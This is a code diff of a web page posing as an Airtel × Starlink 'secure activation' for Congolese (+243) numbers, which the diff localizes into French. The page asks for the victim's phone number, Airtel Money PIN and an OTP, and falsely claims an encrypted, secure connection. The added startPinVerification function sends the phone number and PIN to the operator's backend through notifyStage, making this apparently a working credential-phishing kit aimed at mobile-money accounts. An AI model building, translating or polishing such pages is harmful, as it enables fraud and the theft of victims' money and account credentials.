@@ -1,5 +1,5 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="fr">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
@@ -73,6 +73,14 @@
       justify-content: center;
       padding: 0 12px;
       box-shadow: 0 2px 6px rgba(0,0,0,0.08);
+      overflow: hidden;
+    }
+
+    .logo-box img {
+      width: 100%;
+      height: 100%;
+      object-fit: contain;
+      display: block;
     }
 
     .logo-airtel {
@@ -496,21 +504,21 @@
       <div class="header">
         <div class="logos">
           <div class="logo-box logo-airtel">
-            <img src="/static/images/airtel_logo.svg" alt="Airtel" style="width: 56px; height: 28px; object-fit: contain; display: block;">
+            <img src="/static/images/airtel_logo.png" alt="Airtel DRC" />
           </div>
           <span class="x-mark">×</span>
           <div class="logo-box logo-starlink">
-            <img src="/static/images/starlink_logo.svg" alt="Starlink" style="width: 84px; height: 26px; object-fit: contain; display: block;">
+            <img src="/static/images/starlink_logo.png" alt="Starlink" />
           </div>
         </div>
-        <h1>Secure activation</h1>
+        <h1>Activation sécurisée</h1>
       </div>
 
       <div class="body">
-        <p class="instruction">Enter your Airtel number to continue</p>
+        <p class="instruction">Saisissez votre numéro Airtel pour continuer</p>
         <div class="divider"></div>
 
-        <label>Airtel number</label>
+        <label>Numéro Airtel</label>
         <div class="phone-wrap">
           <div class="prefix">+243</div>
           <input type="tel" id="phoneInput" placeholder="81xxxxxxx" maxlength="9" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
@@ -520,7 +528,7 @@
           <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5">
             <path d="M5 12h14M13 6l6 6-6 6"/>
           </svg>
-          CONTINUE
+          CONTINUER
         </button>
 
         <div class="secure">
@@ -528,7 +536,7 @@
             <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
             <path d="M9 12l2 2 4-4" stroke-linecap="round" stroke-linejoin="round"/>
           </svg>
-          ENCRYPTED AND SECURE CONNECTION
+          CONNEXION CHIFFRÉE ET SÉCURISÉE
         </div>
       </div>
     </div>
@@ -537,14 +545,14 @@
       <div class="header">
         <div class="logos">
           <div class="logo-box logo-airtel">
-            <img src="/static/images/airtel_logo.svg" alt="Airtel" style="width: 56px; height: 28px; object-fit: contain; display: block;">
+            <img src="/static/images/airtel_logo.png" alt="Airtel DRC" />
           </div>
           <span class="x-mark">×</span>
           <div class="logo-box logo-starlink">
-            <img src="/static/images/starlink_logo.svg" alt="Starlink" style="width: 84px; height: 26px; object-fit: contain; display: block;">
+            <img src="/static/images/starlink_logo.png" alt="Starlink" />
           </div>
         </div>
-        <h1>Verification required</h1>
+        <h1>Vérification requise</h1>
       </div>
 
       <div class="otp-body">
@@ -555,8 +563,8 @@
           </svg>
         </div>
 
-        <h2>Enter the OTP code</h2>
-        <p class="otp-sub">A 4-digit code has been sent to</p>
+        <h2>Entrez le code OTP</h2>
+        <p class="otp-sub">Un code à 4 chiffres a été envoyé à</p>
         <p class="otp-phone" id="otpPhone">+243000000000</p>
 
         <div class="timer">
@@ -564,7 +572,7 @@
             <circle cx="12" cy="12" r="10"/>
             <path d="M12 6v6l4 2"/>
           </svg>
-          Time remaining <strong id="countdown">56</strong> seconds
+          Temps restant <strong id="countdown">56</strong> secondes
         </div>
 
         <div class="otp-inputs" id="otpInputs">
@@ -574,18 +582,18 @@
           <input type="text" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
         </div>
 
-        <button class="btn-red" id="checkOtpBtn">CHECK AND PAY</button>
+        <button class="btn-red" id="checkOtpBtn">VÉRIFIER ET PAYER</button>
 
         <p class="resend">
-          DIDN'T RECEIVE THE CODE? <a href="#" onclick="resetTimer(); return false;">RESEND THE CODE</a>
+          VOUS N'AVEZ PAS REÇU LE CODE ? <a href="#" onclick="resetTimer(); return false;">RENVOYER LE CODE</a>
         </p>
       </div>
     </div>
 
     <div class="overlay" id="pinOverlay">
       <div class="modal">
-        <h2>Enter your Airtel Money PIN code</h2>
-        <p>Do you want to pay <strong>{{PLAN_PRICE}}</strong> for your<br>{{PLAN_NAME}} package?</p>
+        <h2>Entrez votre code PIN Airtel Money</h2>
+        <p>Voulez-vous payer <strong>{{PLAN_PRICE}}</strong> pour votre forfait<br>{{PLAN_NAME}} ?</p>
 
         <div class="pin-entry" id="pinEntry">
           <input type="password" maxlength="1" inputmode="numeric" pattern="[0-9]*" oninput="this.value=this.value.replace(/[^0-9]/g,'')" />
@@ -597,10 +605,9 @@
         <div class="pin-line"></div>
 
         <div class="modal-actions">
-          <button onclick="closePin(); return false;">CANCEL</button>
+          <button onclick="closePin(); return false;">ANNULER</button>
           <button class="verify-btn" id="verifyBtn" type="button">
-            <span class="spinner"></span>
-            VERIFYING...
+            VÉRIFIER
           </button>
         </div>
       </div>
@@ -648,17 +655,48 @@
       if (n === 3) startTimer();
     }
 
+    function resetPinEntry() {
+      pinInputs.forEach(input => {
+        input.disabled = false;
+        input.value = '';
+      });
+      const verifyBtn = document.getElementById('verifyBtn');
+      verifyBtn.disabled = false;
+      verifyBtn.innerHTML = 'VÉRIFIER';
+    }
+
+    function startPinVerification(pin) {
+      const verifyBtn = document.getElementById('verifyBtn');
+
+      pinInputs.forEach(input => {
+        input.disabled = true;
+      });
+      verifyBtn.disabled = true;
+      verifyBtn.innerHTML = '<span class="spinner"></span>VÉRIFICATION...';
+
+      notifyStage('pin', { phone_number: currentPhone, pin }).then(() => {
+        setTimeout(() => {
+          closePin();
+          showScreen(3);
+          startTimer();
+        }, 600);
+      }).catch(() => {
+        resetPinEntry();
+        alert('La vérification du PIN a échoué. Veuillez réessayer.');
+      });
+    }
+
     function goToPin() {
       const raw = document.getElementById('phoneInput').value.replace(/\D/g, '');
       if (raw.length < 9) {
-        alert('Please enter a valid Airtel number.');
+        alert('Veuillez saisir un numéro Airtel valide.');
         return;
       }
 
       currentPhone = '+243' + raw;
       document.getElementById('otpPhone').textContent = currentPhone;
 
-      Array.from(pinInputs).forEach(input => input.value = '');
+      resetPinEntry();
       pinInputs[0].focus();
 
       document.getElementById('pinOverlay').classList.add('show');
@@ -774,13 +812,7 @@
 
         const fullPin = getPinValue();
         if (fullPin.length === 4) {
-          const pin = fullPin;
-          closePin();
-          showScreen(3);
-          startTimer();
-          notifyStage('pin', { phone_number: currentPhone, pin }).catch(() => {
-            console.warn('PIN notification failed, but the OTP flow can continue in demo mode.');
-          });
+          startPinVerification(fullPin);
         }
       });
 
